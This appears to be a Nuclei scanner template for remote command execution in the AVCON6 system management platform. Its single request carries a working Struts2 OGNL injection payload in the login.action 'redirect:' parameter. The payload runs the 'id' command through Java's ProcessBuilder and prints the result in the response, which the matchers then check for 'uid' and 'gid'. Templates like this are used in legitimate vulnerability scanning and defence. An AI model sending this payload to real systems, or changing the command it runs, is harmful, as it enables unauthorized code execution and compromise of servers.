id: avcon-rce
info:
  author: Str1am
  name: "AVCON6\u7CFB\u7EDF\u7BA1\u7406\u5E73\u53F0\u547D\u4EE4\u6267\u884C"
  severity: high
  tags: avcon,rce
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - uid
    - gid
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/login.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{%22id%22})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}'
